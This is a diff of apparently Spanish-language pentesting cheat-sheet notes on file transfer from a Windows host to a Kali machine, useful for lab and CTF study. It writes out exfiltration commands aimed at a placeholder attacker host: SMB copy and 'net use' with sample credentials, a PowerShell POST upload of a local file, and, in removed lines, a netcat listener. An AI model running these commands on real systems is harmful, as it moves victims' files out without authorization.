@@ -159,16 +159,16 @@ EXTRA:
    # SCP → requiere SSH activo en Kali y credenciales del usuario Linux
    # -r → recursivo para carpetas
 
-2. ❯ copy .\file.exe \\<IP_KALI>\smbFolder\
+   ❯ copy .\file.exe \\<IP_KALI>\smbFolder\
    # Copiar de Windows a Kali via SMB
    # Kali debe tener impacket-smbserver activo
 
-3. ❯ net use \\<IP_KALI>\smbFolder /u:omar omar123
-   ❯ dir \\<IP_KALI>\smbFolder\
-   ❯ copy file.exe \\<IP_KALI>\smbFolder\
-   # Montar SMB con credenciales → luego copiar
+2. ❯ net use \\<IP_KALI>\smbFolder /u:omar omar123
+	   ❯ dir \\<IP_KALI>\smbFolder\
+	   ❯ copy file.exe \\<IP_KALI>\smbFolder\
+	   # Montar SMB con credenciales → luego copiar
 
-4. ❯ powershell -c "Invoke-WebRequest -Uri http://<IP_KALI>/upload -Method POST -InFile C:\archivo.txt"
+3. ❯ powershell -c "Invoke-WebRequest -Uri http://<IP_KALI>/upload -Method POST -InFile C:\archivo.txt"
    # POST upload a servidor HTTP de Kali
 ```
 
@@ -183,9 +183,6 @@ EXTRA:
 
 3. ❯ python3 -m http.server 80
    # Si Windows hace GET/POST al servidor de Kali
-
-4. ❯ nc -nlvp 443 > archivo_recibido.exe
-   # Recibir via netcat → en Windows usar nc.exe < archivo.exe
 ```
 
 ---
